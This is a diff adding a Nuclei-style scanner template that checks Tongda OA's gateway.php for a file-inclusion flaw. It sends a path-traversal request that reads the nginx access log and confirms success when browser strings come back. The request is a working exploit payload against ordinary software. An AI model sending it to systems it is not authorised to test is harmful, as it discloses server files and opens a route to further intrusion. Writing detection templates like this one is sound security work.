@@ -1,0 +1,31 @@
+id: TongdaOA-gateway-file-include
+
+info:
+  name: 通达OA接口gateway.php存在文件包含漏洞
+  author: htq
+  severity: high
+
+http:
+  - raw:
+    - |
+      @timeout 30s
+      POST /mac/gateway.php HTTP/1.1
+      Accept-Encoding: gzip
+      Content-Type: application/x-www-form-urlencoded
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+      Connection: close
+      Content-Length: 54
+
+      json={"url":"/general/../../nginx/logs/oa.access.log"}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Mozilla"
+          - "Chrome"
+          - "AppleWebkit"
+          - "Safari"
+        condition: or
+
